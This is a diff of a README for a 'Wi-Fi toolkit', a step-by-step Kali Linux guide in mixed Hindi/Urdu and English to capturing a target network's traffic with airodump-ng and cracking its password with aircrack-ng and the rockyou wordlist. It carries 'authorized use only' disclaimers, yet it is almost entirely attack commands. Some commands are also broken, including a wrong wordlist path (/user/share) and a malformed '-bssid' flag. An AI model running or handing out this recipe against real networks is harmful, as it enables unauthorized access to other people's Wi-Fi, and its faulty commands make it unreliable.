@@ -1,70 +1,113 @@
 亗 SALEEM WIFI TOOLKIT 亗
 
-Wi-Fi Security Commands — Kali Linux
+<p align="center">
+  **⚡ WI-FI SECURITY COMMANDS ⚡**Kali Linux • Ethical Hacking • Learning
 
-STEP 1 — Check Wireless Interface
+</p>---
+
+⚠️ IMPORTANT
+
+Use these commands only on your own network or in an authorized testing lab. Never test networks without permission.
+
+---
+
+亗 STEP 01 — CHECK WIRELESS INTERFACE
 
 Command:
 
 iwconfig
 
-Work: Wireless interface ki information check karta hai.
+Work:
+Wireless interface ki information check karta hai.
 
-STEP 2 — Start Monitor Mode
+---
+
+亗 STEP 02 — START MONITOR MODE
 
 Command:
 
 sudo airmon-ng start wlan0
 
-Work: Wireless adapter par monitor mode start karne ke liye hota hai. Sirf apne authorized lab mein use karein.
+Work:
+Wireless adapter par monitor mode start karne ke liye hota hai.
 
-STEP 3 — View Wireless Networks
+---
+
+亗 STEP 03 — VIEW WIRELESS NETWORKS
 
 Command:
 
 airodump-ng wlan0mon
 
-Work: Monitor-mode interface se wireless network information observe karta hai.
+Work:
+Monitor-mode interface se wireless network information observe karta hai.
 
 Stop Process:
 
 Ctrl + C
 
-Work: Running process ko stop karta hai.
+Work:
+Running process ko stop karta hai.
 
-STEP 4 — Target-Specific Packet Capture
+---
+
+亗 STEP 04 — TARGET-SPECIFIC PACKET CAPTURE
 
 Original command:
 
 airodump-ng -c enter_your_tirget_channil --bssid enter_your_tirget_BSSID -w capture wlan0mon
 
-Work: Specified channel aur BSSID ke liye wireless packet capture ka command hai. Iska use sirf authorized lab testing mein hona chahiye.
+Work:
+Specified channel aur BSSID ke liye wireless packet capture ka command hai. Sirf authorized lab testing ke liye.
 
-STEP 5 — Wordlist Directory
+---
+
+亗 STEP 05 — WORDLIST DIRECTORY
 
 Original command:
 
 cd /user/share/wordlists
 
-Work: Wordlist directory mein jane ke liye diya gaya command hai.
+Work:
+Wordlist directory mein jane ke liye diya gaya command hai.
 
-STEP 6 — Extract Compressed Wordlist
+---
+
+亗 STEP 06 — EXTRACT COMPRESSED WORDLIST
 
 Original command:
 
 sudo gzip -d rockyou.txt.gz
 
-Work: Compressed "rockyou.txt.gz" file ko extract karne ke liye hai.
+Work:
+Compressed "rockyou.txt.gz" file ko extract karne ke liye hai.
 
-STEP 7 — Password Audit
+---
+
+亗 STEP 07 — PASSWORD AUDIT
 
 Original command:
 
 aircrack-ng -w /user/share/wordlists/rockyou.txt -bssid enter_your_tirget_BSSID capture-01.cap
 
-Work: Capture file aur wordlist ke zariye Wi-Fi password audit karne ka command hai. Isay unauthorized networks par use na karein.
+Work:
+Capture file aur wordlist ke zariye Wi-Fi password audit karne ka command hai. Unauthorized networks par use na karein.
 
 ---
 
-亗 SALEEM TOOLKIT 亗
-Learn Wi-Fi Security • Practice Legally
+亗 PROJECT INFORMATION
+
+Detail| Information
+Project| SALEEM WIFI TOOLKIT
+Platform| Kali Linux
+Category| Wi-Fi Security
+Purpose| Educational
+License| MIT
+
+---
+
+<p align="center">亗 SALEEM TOOLKIT 亗
+
+LEARN ETHICALLY • PRACTICE LEGALLY • STAY SAFE
+
+</p>
